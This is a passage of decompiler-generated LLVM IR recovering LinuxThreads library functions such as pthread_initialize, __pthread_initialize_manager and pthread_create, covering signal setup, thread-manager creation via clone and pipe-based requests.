  %v0_d814 = load i32, i32* %r3.global-to-local, align 4
  %v1_d814 = load i32, i32* @r4, align 4
  %v2_d814 = add i32 %v1_d814, 68
  %v3_d814 = inttoptr i32 %v2_d814 to i32*
  store i32 %v0_d814, i32* %v3_d814, align 4
  %v0_d818 = load i32, i32* @r4, align 4
  %v2_d818 = inttoptr i32 %v0_d818 to i32*
  store i32 %v0_d818, i32* %v2_d818, align 4
  %v0_d81c = load i32, i32* @r4, align 4
  %v2_d81c = add i32 %v0_d81c, 4
  %v3_d81c = inttoptr i32 %v2_d81c to i32*
  store i32 %v0_d81c, i32* %v3_d81c, align 4
  %v2_d820 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_d820, i32* @r4, align 4
  store i32 %v6_d7a0, i32* @r5, align 4
  ret i32 %v0_d7f8

; uselistorder directives
  uselistorder i32 %v0_d81c, { 1, 0 }
  uselistorder i32 %v0_d818, { 1, 0 }
  uselistorder i32 68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d7f8, { 1, 0 }
}

define i32 @__pthread_kill_other_threads_np() local_unnamed_addr {
entry:
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  store i32 0, i32* @r0, align 4
  %v2_d84c = ptrtoint i32* %stack_var_-152 to i32
  %v0_d850 = call i32 @pthread_onexit_process()
  store i32 %v2_d84c, i32* @r5, align 4
  %v0_d858 = call i32 @__pthread_reset_main_thread()
  %v2_d85c = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_d85c, i32* @r0, align 4
  %v1_d860 = call i32 @sigemptyset(i32 %v2_d85c)
  store i32 0, i32* @r4, align 4
  %v2_d86c = load i32, i32* @global_var_2b488.309, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v4_d880 = call i32 @__libc_sigaction(i32 %v2_d86c, i32* nonnull %stack_var_-152, i32 0)
  %v2_d88c = load i32, i32* @global_var_2b48c.226, align 4
  %v0_d890 = load i32, i32* @r4, align 4
  %v4_d894 = call i32 @__libc_sigaction(i32 %v2_d88c, i32* nonnull %stack_var_-152, i32 %v0_d890)
  %v2_d89c = load i32, i32* @global_var_2b490.204, align 4
  %v1_d8a0 = load i32, i32* @r4, align 4
  %v2_d8a0 = sub i32 %v2_d89c, %v1_d8a0
  %v4_d8a0 = xor i32 %v1_d8a0, %v2_d89c
  %v5_d8a0 = xor i32 %v2_d8a0, %v2_d89c
  %v6_d8a0 = and i32 %v5_d8a0, %v4_d8a0
  %v7_d8a0 = icmp slt i32 %v6_d8a0, 0
  %v8_d8a0 = icmp slt i32 %v2_d8a0, 0
  %v9_d8a0 = icmp eq i32 %v2_d89c, %v1_d8a0
  %v3_d8b0 = xor i1 %v8_d8a0, %v7_d8a0
  %v4_d8b0 = or i1 %v9_d8a0, %v3_d8b0
  %v5_d8b0 = xor i1 %v4_d8b0, true
  call void @__pseudo_cond_branch(i1 %v5_d8b0, i32 ptrtoint (i32* @global_var_fdc0.380 to i32))
  ret i32 %v2_d89c

; uselistorder directives
  uselistorder i32 %v2_d8a0, { 1, 0 }
  uselistorder i32 %v1_d8a0, { 1, 0, 2 }
  uselistorder i32 %v2_d89c, { 2, 4, 0, 1, 3 }
  uselistorder i32 ()* @__pthread_reset_main_thread, { 1, 0 }
}

define i32 @pthread_initialize() local_unnamed_addr {
entry:
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4194608 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %v2_d8d0 = load i32, i32* @global_var_2be4c.179, align 4
  store i32 %v2_d8d0, i32* @r4, align 4
  %v2_d8d4 = icmp eq i32 %v2_d8d0, 0
  %v2_d8d8 = ptrtoint i32* %stack_var_-304 to i32
  br i1 %v2_d8d4, label %dec_label_pc_d8e0, label %dec_label_pc_da54

dec_label_pc_d8e0:                                ; preds = %entry
  %v2_d8e0 = ptrtoint i32* %stack_var_-4194608 to i32
  %v3_d8e4 = and i32 %v2_d8e0, -2097152
  store i32 %v3_d8e4, i32* @global_var_2be4c.179, align 4
  %v0_d8f0 = call i32 @__libc_getpid()
  %v2_d8fc = load i32, i32* bitcast (i32** @global_var_2b57c.384 to i32*), align 4
  store i32 %v2_d8fc, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2deac.373 to i32), i32* bitcast (i32** @global_var_2b10c.387 to i32*), align 4
  %v0_d90c = load i32, i32* @r4, align 4
  store i32 %v0_d90c, i32* @global_var_2b5b0.389, align 4
  store i32 %v0_d8f0, i32* @global_var_2b0d4.391, align 4
  store i32 ptrtoint (i32* @global_var_2dea8.376 to i32), i32* bitcast (i32** @global_var_2b104.392 to i32*), align 4
  %v2_d9343 = icmp eq i32 %v2_d8fc, 0
  br i1 %v2_d9343, label %dec_label_pc_d93c, label %dec_label_pc_d920

dec_label_pc_d920:                                ; preds = %dec_label_pc_d8e0, %.thread
  %v2_d92c = phi i32 [ %v3_d930, %.thread ], [ %v2_d8fc, %dec_label_pc_d8e0 ]
  %v1_d920 = add i32 %v2_d92c, 52
  %v2_d920 = inttoptr i32 %v1_d920 to i32*
  %v3_d920 = load i32, i32* %v2_d920, align 4
  %v7_d924 = icmp eq i32 %v3_d920, 1
  br i1 %v7_d924, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d920
  store i32 0, i32* %v2_d920, align 4
  %v0_d930.pre = load i32, i32* @r5, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d920, %bb
  %v0_d930 = phi i32 [ %v2_d92c, %dec_label_pc_d920 ], [ %v0_d930.pre, %bb ]
  %v1_d930 = add i32 %v0_d930, 32
  %v2_d930 = inttoptr i32 %v1_d930 to i32*
  %v3_d930 = load i32, i32* %v2_d930, align 4
  store i32 %v3_d930, i32* @r5, align 4
  %v2_d934 = icmp eq i32 %v3_d930, 0
  br i1 %v2_d934, label %dec_label_pc_d934.dec_label_pc_d93c_crit_edge, label %dec_label_pc_d920

dec_label_pc_d934.dec_label_pc_d93c_crit_edge:    ; preds = %.thread
  br label %dec_label_pc_d93c

dec_label_pc_d93c:                                ; preds = %dec_label_pc_d934.dec_label_pc_d93c_crit_edge, %dec_label_pc_d8e0
  %v2_d93c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_d93c, i32* @r4, align 4
  %v2_d948 = call i32 @getrlimit(i32 3, i32 %v2_d93c)
  %v0_d94c = call i32 @__GI_getpagesize()
  %v3_d954 = load i32, i32* %stack_var_-36, align 4
  %tmp = mul i32 %v0_d94c, -2
  %v1_d958 = add i32 %tmp, 2097152
  %tmp26 = icmp ugt i32 %v3_d954, %v1_d958
  br i1 %tmp26, label %bb24, label %.thread10

bb24:                                             ; preds = %dec_label_pc_d93c
  store i32 %v1_d958, i32* %stack_var_-36, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d93c, %bb24
  store i32 55664, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp26, i32 ptrtoint (i32* @global_var_10904.393 to i32))
  %v2_d974 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_d974, i32* @r4, align 4
  store i32 %v2_d974, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_de48.395 to i32), i32* %stack_var_-304, align 4
  store i32 %v2_d8d8, i32* @r6, align 4
  %v1_d984 = call i32 @sigemptyset(i32 %v2_d974)
  store i32 ptrtoint (i32* @global_var_2b488.309 to i32), i32* @r7, align 4
  %v0_d98c = load i32, i32* @r5, align 4
  %v2_d994 = load i32, i32* @global_var_2b488.309, align 4
  %v5_d99c = call i32 @__libc_sigaction(i32 %v2_d994, i32* nonnull %stack_var_-304, i32 %v0_d98c)
  %v2_d9a4 = load i32, i32* @global_var_2b488.309, align 4
  store i32 %v2_d974, i32* @r0, align 4
  store i32 56724, i32* %stack_var_-304, align 4
  %v2_d9b0 = call i32 @__GI_sigaddset(i32 %v2_d974, i32 %v2_d9a4)
  store i32 ptrtoint (i32* @global_var_2b48c.226 to i32), i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_2b490.204 to i32), i32* @r8, align 4
  %v2_d9bc = load i32, i32* @global_var_2b48c.226, align 4
  %v0_d9c4 = load i32, i32* @r5, align 4
  %v5_d9c8 = call i32 @__libc_sigaction(i32 %v2_d9bc, i32* nonnull %stack_var_-304, i32 %v0_d9c4)
  %v2_d9cc = load i32, i32* @global_var_2b490.204, align 4
  %tmp25 = icmp slt i32 %v2_d9cc, 1
  br i1 %tmp25, label %dec_label_pc_d9f8, label %dec_label_pc_d9d8

dec_label_pc_d9d8:                                ; preds = %.thread10
  store i32 %v2_d974, i32* @r0, align 4
  store i32 54604, i32* %stack_var_-304, align 4
  %v1_d9e4 = call i32 @sigemptyset(i32 %v2_d974)
  %v2_d9e8 = load i32, i32* @global_var_2b490.204, align 4
  %v0_d9f0 = load i32, i32* @r5, align 4
  %v5_d9f4 = call i32 @__libc_sigaction(i32 %v2_d9e8, i32* nonnull %stack_var_-304, i32 %v0_d9f0)
  br label %dec_label_pc_d9f8

dec_label_pc_d9f8:                                ; preds = %.thread10, %dec_label_pc_d9d8
  %v2_d9f8 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_d9f8, i32* @r4, align 4
  store i32 %v2_d9f8, i32* @r0, align 4
  %v1_da00 = call i32 @sigemptyset(i32 %v2_d9f8)
  %v2_da04 = load i32, i32* @global_var_2b488.309, align 4
  store i32 %v2_d9f8, i32* @r0, align 4
  %v2_da0c = call i32 @__GI_sigaddset(i32 %v2_d9f8, i32 %v2_da04)
  %v0_da10 = load i32, i32* @r5, align 4
  %v5_da1c = bitcast i32* %stack_var_-164 to %_TYPEDEF_sigset_t*
  %v6_da1c = call i32 @__GI_sigprocmask(i32 %v0_da10, %_TYPEDEF_sigset_t* %v5_da1c, i32 %v0_da10)
  store i32 %v2_d9f8, i32* @r0, align 4
  %v1_da28 = call i32 @__GI_sigdelset(i32 %v2_d9f8)
  %v2_da2c = load i32, i32* @global_var_2b48c.226, align 4
  store i32 %v2_d9f8, i32* @r0, align 4
  %v2_da34 = call i32 @__GI_sigaddset(i32 %v2_d9f8, i32 %v2_da2c)
  %v0_da40 = load i32, i32* @r5, align 4
  %v5_da44 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v5_da1c, i32 %v0_da40)
  %v0_da48 = load i32, i32* @r5, align 4
  %v3_da50 = call i32 @on_exit(i32 55020, i32 %v0_da48)
  br label %dec_label_pc_da54

dec_label_pc_da54:                                ; preds = %entry, %dec_label_pc_d9f8
  %.0 = phi i32 [ %v3_da50, %dec_label_pc_d9f8 ], [ undef, %entry ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_da10, { 1, 0 }
  uselistorder i32 %v2_d9f8, { 1, 0, 3, 2, 5, 4, 7, 6, 8 }
  uselistorder i32 %v2_d974, { 1, 0, 3, 2, 5, 4, 6 }
  uselistorder i1 %tmp26, { 1, 0 }
  uselistorder i32 %v1_d958, { 1, 0 }
  uselistorder i32 %v3_d930, { 1, 2, 0 }
  uselistorder i32* %stack_var_-304, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder i32 (i32)* @__GI_sigdelset, { 3, 0, 7, 6, 5, 4, 2, 1 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32* @global_var_2b488.309, { 0, 1, 2, 9, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32)* @sigemptyset, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* @global_var_2dea8.376, { 1, 0 }
  uselistorder label %dec_label_pc_da54, { 1, 0 }
  uselistorder label %dec_label_pc_d9f8, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_d920, { 1, 0 }
}

define i32 @__pthread_initialize_manager() local_unnamed_addr {
entry:
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %v3_da94 = load i32, i32* @r4, align 4
  %v6_da94 = load i32, i32* @r5, align 4
  %v9_da94 = load i32, i32* @r6, align 4
  %v2_da98 = load i32, i32* @global_var_2be4c.179, align 4
  %v2_daa0 = load i32, i32* @global_var_2be60.404, align 4
  %v2_daa4 = icmp eq i32 %v2_da98, 0
  %v2_daac = ptrtoint i32* %stack_var_-172 to i32
  %v2_dab0 = inttoptr i32 %v2_daa0 to i32*
  store i32 1, i32* %v2_dab0, align 4
  store i32 55992, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_daa4, i32 ptrtoint (i32* @global_var_d8c8.405 to i32))
  store i32 ptrtoint (i32* @global_var_300c8.241 to i32), i32* @r4, align 4
  %v2_dabc = load i32, i32* @global_var_300c8.241, align 4
  %v2_dac0 = mul i32 %v2_dabc, 2
  %v1_dac4 = add i32 %v2_dac0, -32
  %v1_dac8 = call i32 @malloc(i32 %v1_dac4)
  store i32 ptrtoint (i32* @global_var_2be50.182 to i32), i32* @r5, align 4
  %v2_dad0 = icmp eq i32 %v1_dac8, 0
  store i32 %v1_dac8, i32* @global_var_2be50.182, align 4
  br i1 %v2_dad0, label %.thread3, label %dec_label_pc_dae0

.thread3:                                         ; preds = %entry
  br label %dec_label_pc_dc88

dec_label_pc_dae0:                                ; preds = %entry
  %v2_dae0 = load i32, i32* @global_var_300c8.241, align 4
  store i32 ptrtoint (i32* @global_var_2be54.184 to i32), i32* @r6, align 4
  %v3_dae8 = mul i32 %v2_dae0, 2
  %v4_dae8 = add i32 %v1_dac8, -32
  %v1_daec = add i32 %v4_dae8, %v3_dae8
  %v2_daf0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v1_daec, i32* @global_var_2be54.184, align 4
  %v1_daf8 = call i32 @__GI_pipe(i32 %v2_daf0)
  %v3_dafc = icmp eq i32 %v1_daf8, -1
  store i32 %v1_daf8, i32* @r4, align 4
  br i1 %v3_dafc, label %dec_label_pc_db08, label %dec_label_pc_db14

dec_label_pc_db08:                                ; preds = %dec_label_pc_dae0
  %v2_db08 = load i32, i32* @global_var_2be50.182, align 4
  store i32 %v2_db08, i32* @r0, align 4
  %v0_db0c = call i32 @free()
  br label %dec_label_pc_dbf4

dec_label_pc_db14:                                ; preds = %dec_label_pc_dae0
  %v2_db18 = load i32, i32* @global_var_3024c.410, align 4
  %v2_db1c = icmp eq i32 %v2_db18, 0
  br i1 %v2_db1c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_db14
  store i32 %v2_db18, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2b0c0 to i32), i32 412) to i32*), align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_db14, %bb
  %v3_db2c = load i32, i32* @global_var_2b25c.412, align 4
  %v2_db30 = icmp eq i32 %v3_db2c, 0
  br i1 %v2_db30, label %dec_label_pc_dbb4, label %dec_label_pc_db38

dec_label_pc_db38:                                ; preds = %.thread
  %v3_db3c = load i32, i32* @global_var_2b260.414, align 4
  %v2_db40 = load i32, i32* @global_var_3023c.215, align 4
  %v2_db44 = or i32 %v2_db40, %v3_db3c
  %v1_db48 = and i32 %v2_db44, 128
  %v2_db48 = icmp eq i32 %v1_db48, 0
  br i1 %v2_db48, label %dec_label_pc_dbb4, label %dec_label_pc_db50

dec_label_pc_db50:                                ; preds = %dec_label_pc_db38
  %v3_db58 = load i32, i32* bitcast (i32** @global_var_2b2bc.260 to i32*), align 4
  %v2_db5c = call i32 @__pthread_lock(i32 %v3_db58, i32 0)
  %v2_db60 = load i32, i32* @global_var_2be54.184, align 4
  store i32 3840, i32* @r2, align 4
  %v3_db6c = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_db6c, i32* @r3, align 4
  %v2_db70 = call i32 @clone(i32 ptrtoint (i32* @global_var_b924.417 to i32), i32 %v2_db60)
  store i32 %v2_db70, i32* @r0, align 4
  %v7_db74 = icmp eq i32 %v2_db70, -1
  store i32 %v2_db70, i32* @r4, align 4
  br i1 %v7_db74, label %dec_label_pc_dba4, label %dec_label_pc_db80

dec_label_pc_db80:                                ; preds = %dec_label_pc_db50
  store i32 8, i32* @global_var_2b448.418, align 4
  %v0_db8c = load i32, i32* @r5, align 4
  store i32 %v0_db8c, i32* @global_var_30244.217, align 4
  store i32 %v0_db8c, i32* @global_var_2b44c.421, align 4
  store i32 2049, i32* @global_var_2b2b0.422, align 4
  store i32 %v2_db70, i32* @global_var_2b2b4.191, align 4
  %v0_dba0 = call i32 @__linuxthreads_create_event()
  br label %dec_label_pc_dba4

dec_label_pc_dba4:                                ; preds = %dec_label_pc_db50, %dec_label_pc_db80
  %v3_dba4 = load i32, i32* bitcast (i32** @global_var_2b2bc.260 to i32*), align 4
  %v1_dba8 = call i32 @__pthread_unlock(i32 %v3_dba4)
  %v0_dbac = load i32, i32* @r4, align 4
  %v2_dbac = icmp eq i32 %v0_dbac, 0
  br i1 %v2_dbac, label %dec_label_pc_dbb4, label %dec_label_pc_dbd0

dec_label_pc_dbb4:                                ; preds = %dec_label_pc_dba4, %dec_label_pc_db38, %.thread
  %v2_dbbc = load i32, i32* @global_var_2be54.184, align 4
  store i32 3840, i32* @r2, align 4
  %v3_dbc4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_dbc4, i32* @r3, align 4
  %v2_dbc8 = call i32 @clone(i32 ptrtoint (i32* @global_var_b1cc.424 to i32), i32 %v2_dbbc)
  store i32 %v2_dbc8, i32* @r4, align 4
  br label %dec_label_pc_dbd0

dec_label_pc_dbd0:                                ; preds = %dec_label_pc_dba4, %dec_label_pc_dbb4
  %v0_dc28 = phi i32 [ %v2_dbc8, %dec_label_pc_dbb4 ], [ %v0_dbac, %dec_label_pc_dba4 ]
  %v3_dbd0 = icmp eq i32 %v0_dc28, -1
  br i1 %v3_dbd0, label %dec_label_pc_dbd8, label %dec_label_pc_dbfc

dec_label_pc_dbd8:                                ; preds = %dec_label_pc_dbd0
  %v2_dbdc = load i32, i32* @global_var_2be50.182, align 4
  store i32 %v2_dbdc, i32* @r0, align 4
  %v0_dbe0 = call i32 @free()
  %v3_dbe4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_dbe4, i32* @r0, align 4
  %v1_dbe8 = call i32 @__libc_close(i32 %v3_dbe4)
  store i32 %tmp4, i32* @r0, align 4
  %v1_dbf0 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_dbf4

dec_label_pc_dbf4:                                ; preds = %dec_label_pc_db08, %dec_label_pc_dbd8
  %v0_dbf4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_dc88

dec_label_pc_dbfc:                                ; preds = %dec_label_pc_dbd0
  %v2_dc00 = load i32, i32* @global_var_30248.202, align 4
  %v2_dc08 = icmp eq i32 %v2_dc00, 0
  store i32 %tmp4, i32* @global_var_2b484.197, align 4
  %v3_dc18 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_dc18, i32* @global_var_30250.370, align 4
  store i32 %v0_dc28, i32* @global_var_2b2b4.191, align 4
  store i32 2049, i32* @global_var_2b2b0.422, align 4
  br i1 %v2_dc08, label %dec_label_pc_dc50, label %dec_label_pc_dc34

dec_label_pc_dc34:                                ; preds = %dec_label_pc_dbfc
  %v2_dc38 = load i32, i32* @global_var_2b490.204, align 4
  %tmp12 = icmp slt i32 %v2_dc38, 1
  br i1 %tmp12, label %dec_label_pc_dc50, label %dec_label_pc_dc44

dec_label_pc_dc44:                                ; preds = %dec_label_pc_dc34
  %v1_dc44 = call i32 @__GI_raise(i32 %v2_dc38)
  %v0_dc48 = call i32 @_thread_self.3()
  %v1_dc4c = call i32 @__pthread_wait_for_restart_signal(i32 %v0_dc48)
  br label %dec_label_pc_dc50

dec_label_pc_dc50:                                ; preds = %dec_label_pc_dc34, %dec_label_pc_dbfc, %dec_label_pc_dc44
  br label %dec_label_pc_dc58

dec_label_pc_dc58:                                ; preds = %dec_label_pc_dc74, %dec_label_pc_dc50
  store i32 %v2_daac, i32* @r1, align 4
  %v2_dc60 = load i32, i32* @global_var_2b484.197, align 4
  store i32 %v2_dc60, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_dc68 = call i32 @__libc_write(i32 %v2_dc60, i32 %v2_daac)
  %v3_dc6c = icmp eq i32 %v2_dc68, -1
  br i1 %v3_dc6c, label %dec_label_pc_dc74, label %dec_label_pc_dc84

dec_label_pc_dc74:                                ; preds = %dec_label_pc_dc58
  %v0_dc74 = call i32 @__errno_location()
  %v1_dc78 = inttoptr i32 %v0_dc74 to i32*
  %v2_dc78 = load i32, i32* %v1_dc78, align 4
  %v7_dc7c = icmp eq i32 %v2_dc78, 4
  br i1 %v7_dc7c, label %dec_label_pc_dc58, label %dec_label_pc_dc84

dec_label_pc_dc84:                                ; preds = %dec_label_pc_dc58, %dec_label_pc_dc74
  br label %dec_label_pc_dc88

dec_label_pc_dc88:                                ; preds = %.thread3, %dec_label_pc_dbf4, %dec_label_pc_dc84
  %v14_dc8c = phi i32 [ %v0_dbf4, %dec_label_pc_dbf4 ], [ 0, %dec_label_pc_dc84 ], [ -1, %.thread3 ]
  store i32 %v3_da94, i32* @r4, align 4
  store i32 %v6_da94, i32* @r5, align 4
  store i32 %v9_da94, i32* @r6, align 4
  ret i32 %v14_dc8c

; uselistorder directives
  uselistorder i32 %v2_db70, { 1, 2, 0, 3 }
  uselistorder i32 %v2_daac, { 1, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1 }
  uselistorder i32* @global_var_2b490.204, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder label %dec_label_pc_dc88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_dc84, { 1, 0 }
  uselistorder label %dec_label_pc_dc50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dbf4, { 1, 0 }
  uselistorder label %dec_label_pc_dbd0, { 1, 0 }
  uselistorder label %dec_label_pc_dba4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %v2_dcdc = load i32, i32* @global_var_2b484.197, align 4
  %v1_dce0 = icmp slt i32 %v2_dcdc, 0
  %v2_dce4 = ptrtoint i32* %stack_var_-172 to i32
  store i32 %tmp, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v1_dce0, label %dec_label_pc_dcfc, label %dec_label_pc_dd0c

dec_label_pc_dcfc:                                ; preds = %entry
  %v0_dcfc = call i32 @__pthread_initialize_manager()
  store i32 %v0_dcfc, i32* %r0.global-to-local, align 4
  %v1_dd00 = icmp slt i32 %v0_dcfc, 0
  br i1 %v1_dd00, label %.thread7, label %dec_label_pc_dd0c

.thread7:                                         ; preds = %dec_label_pc_dcfc
  store i32 11, i32* %r0.global-to-local, align 4
  br label %bb21

dec_label_pc_dd0c:                                ; preds = %dec_label_pc_dcfc, %entry
  %v0_dd0c = call i32 @_thread_self.3()
  store i32 %v0_dd0c, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_dd20 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v0_dd0c, i32* %stack_var_-172, align 4
  %v4_dd38 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_dd20)
  store i32 %v4_dd38, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dd3c

dec_label_pc_dd3c:                                ; preds = %dec_label_pc_dd58, %dec_label_pc_dd0c
  store i32 %v2_dce4, i32* @r1, align 4
  %v2_dd44 = load i32, i32* @global_var_2b484.197, align 4
  store i32 %v2_dd44, i32* @r0, align 4
  store i32 148, i32* @r2, align 4
  %v2_dd4c = call i32 @__libc_write(i32 %v2_dd44, i32 %v2_dce4)
  store i32 %v2_dd4c, i32* %r0.global-to-local, align 4
  %v3_dd50 = icmp eq i32 %v2_dd4c, -1
  br i1 %v3_dd50, label %dec_label_pc_dd58, label %dec_label_pc_dd68

dec_label_pc_dd58:                                ; preds = %dec_label_pc_dd3c
  %v0_dd58 = call i32 @__errno_location()
  store i32 %v0_dd58, i32* %r0.global-to-local, align 4
  %v1_dd5c = inttoptr i32 %v0_dd58 to i32*
  %v2_dd5c = load i32, i32* %v1_dd5c, align 4
  %v7_dd60 = icmp eq i32 %v2_dd5c, 4
  br i1 %v7_dd60, label %dec_label_pc_dd3c, label %dec_label_pc_dd68

dec_label_pc_dd68:                                ; preds = %dec_label_pc_dd3c, %dec_label_pc_dd58
  %v0_dd68 = load i32, i32* @r4, align 4
  store i32 %v0_dd68, i32* @r0, align 4
  %v1_dd6c = call i32 @_suspend.4(i32 %v0_dd68)
  store i32 %v1_dd6c, i32* %r0.global-to-local, align 4
  %v0_dd70 = load i32, i32* @r4, align 4
  %v1_dd70 = add i32 %v0_dd70, 52
  %v2_dd70 = inttoptr i32 %v1_dd70 to i32*
  %v3_dd70 = load i32, i32* %v2_dd70, align 4
  %v2_dd74 = icmp eq i32 %v3_dd70, 0
  br i1 %v2_dd74, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_dd68
  %v3_dd7c4 = load i32, i32* %v2_dd70, align 4
  store i32 %v3_dd7c4, i32* %r0.global-to-local, align 4
  br label %bb21

bb:                                               ; preds = %dec_label_pc_dd68
  %v2_dd78 = add i32 %v0_dd70, 48
  %v3_dd78 = inttoptr i32 %v2_dd78 to i32*
  %v4_dd78 = load i32, i32* %v3_dd78, align 4
  %v3_dd7c = load i32, i32* %v2_dd70, align 4
  store i32 %v3_dd7c, i32* %r0.global-to-local, align 4
  %v2_dd80 = load i32, i32* @r8, align 4
  %v3_dd80 = inttoptr i32 %v2_dd80 to i32*
  store i32 %v4_dd78, i32* %v3_dd80, align 4
  %v20_dd88.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb21

bb21:                                             ; preds = %.thread7, %.thread, %bb
  %v20_dd88 = phi i32 [ %v3_dd7c4, %.thread ], [ %v20_dd88.pre, %bb ], [ 11, %.thread7 ]
  ret i32 %v20_dd88

; uselistorder directives
  uselistorder i32 %v2_dce4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 10, 3, 4, 5, 8, 6, 7, 9, 0 }
  uselistorder i32 (i32)* @_suspend.4, { 1, 0 }
  uselistorder i32 ()* @__pthread_initialize_manager, { 1, 0 }
  uselistorder label %bb21, { 2, 1, 0 }
  uselistorder label %dec_label_pc_dd68, { 1, 0 }
}

define i32 @__pthread_initialize() local_unnamed_addr {
entry:
  %v0_dd90 = call i32 @pthread_initialize()
  ret i32 %v0_dd90
}

define i32 @pthread_handle_sigcancel(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_dd94 = load i32, i32* @r4, align 4
  store i32 %v3_dd94, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v0_dd9c = call i32 @_thread_self.3()
  store i32 %v0_dd9c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2b2a0.186 to i32), i32* %r2.global-to-local, align 4
  %v9_dda4 = icmp eq i32 %v0_dd9c, ptrtoint (i32* @global_var_2b2a0.186 to i32)
  br i1 %v9_dda4, label %dec_label_pc_ddac, label %dec_label_pc_ddb8

dec_label_pc_ddac:                                ; preds = %entry
  %v0_ddac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ddac, i32* @r0, align 4
  %v2_ddb0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ddb0, i32* @r4, align 4
  %v1_ddb4 = call i32 @__pthread_manager_sighandler(i32 %v0_ddac)
  store i32 %v1_ddb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ddb8

dec_label_pc_ddb8:                                ; preds = %entry, %dec_label_pc_ddac
  %v9_ddf8 = phi i32 [ %v0_dd9c, %entry ], [ %v1_ddb4, %dec_label_pc_ddac ]
  %v2_ddbc = load i32, i32* @global_var_2be58.254, align 4
  store i32 %v2_ddbc, i32* %r3.global-to-local, align 4
  %v2_ddc0 = icmp eq i32 %v2_ddbc, 0
  br i1 %v2_ddc0, label %dec_label_pc_ddf0, label %dec_label_pc_ddc8

dec_label_pc_ddc8:                                ; preds = %dec_label_pc_ddb8
  %v2_ddcc = load i32, i32* bitcast (i32** @global_var_2b480.199 to i32*), align 4
  store i32 %v2_ddcc, i32* %r3.global-to-local, align 4
  %v9_ddd0 = icmp eq i32 %v9_ddf8, %v2_ddcc
  br i1 %v9_ddd0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_ddc8
  %v4_ddd4 = load i32, i32* @global_var_2b2b4.191, align 4
  store i32 %v4_ddd4, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_ddc8, %bb
  call void @__pseudo_cond_branch(i1 %v9_ddd0, i32 ptrtoint (i32* @global_var_cec0.433 to i32))
